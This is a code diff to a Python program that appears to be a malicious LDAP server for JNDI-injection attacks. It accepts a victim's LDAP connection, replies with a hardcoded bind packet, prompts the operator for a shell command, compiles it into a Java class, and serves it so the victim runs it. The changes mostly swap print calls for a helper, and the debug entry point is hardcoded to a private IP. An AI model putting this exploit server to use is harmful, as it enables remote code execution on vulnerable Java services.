@@ -1,7 +1,7 @@
 from datetime import datetime
 from termcolor import colored
 import socket
-import Utils
+import Utils as ut
 import time
 import Generate
 import os
@@ -74,9 +74,9 @@ def OpenLDAPService(host, port, hport):
 
             with conn as c:
                 try:
-                    print(1)
                     timestamp = datetime.now().ctime()
-                    print(colored(f"[+] Connecting by {addr[0]}:{addr[1]} ({timestamp})\n", "green"))
+                    ut.cprint(f"[+] Connecting by {addr[0]}:{addr[1]} ({timestamp})\n", "green")
+                    #print(colored(f"[+] Connecting by {addr[0]}:{addr[1]} ({timestamp})\n", "green"))
                     c.recv(8096)
                     c.sendall(b"0\x0c\x02\x01\x01a\x07\n\x01\x00\x04\x00\x04\x00")
                     time.sleep(0.5)
@@ -85,13 +85,14 @@ def OpenLDAPService(host, port, hport):
                     queryLocation = query[9:9 + query[8:][0]].decode()
 
                     if not query or len(query) < 10:
-                        print(colored("[-] Connection Suspended", "red"))
+                        ut.cprint("[-] Connection Suspended", "red")
                         return
 
-                    command = Utils.printInputPrompt("command", "[?] Command : ")
-                    print(colored("[+] Command was sent succefully.\n", "green"))
+                    command = ut.printInputPrompt("command", "Command :")
+                    ut.cprint("[+] Command was sent succefully.\n", "green")
+                    # print(colored("[+] Command was sent succefully.\n", "green"))
 
-                    className = Utils.randomName()
+                    className = ut.randomName()
                     Generate.generateClass(command, className)
 
                     # Create response packet
@@ -108,10 +109,12 @@ def OpenLDAPService(host, port, hport):
 
                 except Exception as e:
                     print(e)
-                    print(colored('[!] Unable to exploit the connection.\n', 'red'))
+                    ut.cprint('[!] Unable to exploit the connection.\n', 'red')
+                    # print(colored('[!] Unable to exploit the connection.\n', 'red'))
                 finally:
                     c.close()
 
 
+#debug main
 if __name__ == "__main__":
     OpenLDAPService('192.168.200.212', 65210, 65211)
